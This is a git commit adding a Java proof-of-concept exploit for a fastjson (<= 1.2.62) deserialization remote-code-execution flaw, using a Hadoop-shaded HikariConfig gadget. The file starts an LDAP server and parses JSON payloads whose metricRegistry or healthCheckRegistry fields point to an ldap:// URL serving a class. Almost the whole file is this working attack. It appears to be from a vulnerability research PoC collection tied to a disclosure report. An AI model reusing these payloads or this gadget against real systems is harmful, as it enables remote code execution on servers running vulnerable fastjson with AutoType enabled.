14e6c7c5c253dd7ac003a98c4dba4710f3f61c08
threedr3am <929811313@qq.com>
2020-02-29 11:55:03 +0800

    feat:fastjson新gadget（hadoop）

---
+++ fastjson/src/main/java/com/threedr3am/bug/fastjson/HadoopHikariPoc.java
@@ -0,0 +1,34 @@
+package com.threedr3am.bug.fastjson;
+
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.ParserConfig;
+import com.threedr3am.bug.common.server.LdapServer;
+
+/**
+ * fastjson <= 1.2.62 RCE，需要开启AutoType (report by threedr3am to ASRC)
+ *
+ * <dependency>
+ *       <groupId>org.apache.hadoop</groupId>
+ *       <artifactId>hadoop-client-minicluster</artifactId>
+ *       <version>3.2.1</version>
+ * </dependency>
+ *
+ * @author threedr3am
+ */
+public class HadoopHikariPoc {
+  static {
+    //rmi server示例
+//    RmiServer.run();
+
+    //ldap server示例
+    LdapServer.run();
+  }
+
+  public static void main(String[] args) {
+    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+
+    String payload = "{\"@type\":\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"ldap://localhost:43658/Calc\"}";
+    String payload2 = "{\"@type\":\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\",\"healthCheckRegistry\":\"ldap://localhost:43658/Calc\"}";
+    JSON.parse(payload);
+  }
+}
